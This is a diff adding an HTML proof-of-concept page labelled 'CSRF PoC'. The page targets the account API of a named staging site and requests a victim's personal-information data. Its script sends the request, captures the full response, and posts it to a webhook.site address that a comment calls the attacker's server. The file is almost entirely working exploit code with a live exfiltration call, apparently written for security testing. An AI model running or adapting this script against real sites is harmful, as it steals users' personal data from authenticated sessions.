@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<h1>CSRF PoC</h1>
+<body>
+  <form id="csrfForm" action="https://stage.agrev.com/my-account/_jcr_content/root/container/my_account.api.json">
+    <input type="hidden" name="service" value="personal&#45;information" />
+</form>
+  <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://stage.agrev.com/my-account/_jcr_content/root/container/my_account.api.json", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+        // Capture the entire response body
+        var responseBody = xhr.responseText;
+
+        // Send the captured response body to the attacker's server
+        var logXhr = new XMLHttpRequest();
+        logXhr.open("POST", "https://webhook.site/72d744f0-5434-42ff-a1f9-626af187c6fc", true);
+        logXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        logXhr.send("response=" + encodeURIComponent(responseBody));
+      }
+    };
+    // Serialize the form data and send it
+    var formData = new FormData(document.getElementById("csrfForm"));
+    var params = new URLSearchParams(formData).toString();
+    xhr.send(params);
+  </script>
+</body>
+</html>
